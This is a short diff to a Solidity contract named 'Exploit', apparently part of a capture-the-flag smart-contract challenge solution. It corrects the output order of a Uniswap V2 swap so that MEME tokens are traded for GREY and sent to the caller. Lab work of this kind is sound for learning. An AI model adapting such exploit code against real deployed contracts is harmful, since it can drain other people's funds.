@@ -41,7 +41,7 @@ contract Exploit {
 
         // Swap all MEME for GREY
         setup.meme().transfer(pair, setup.meme().balanceOf(address(this)));
-        UniswapV2Pair(pair).swap(1.65e18, 0, address(this), "");
+        UniswapV2Pair(pair).swap(0, 1.65e18, address(this), "");
 
         // Send all GREY to msg.sender
         setup.grey().transfer(msg.sender, setup.grey().balanceOf(address(this)));
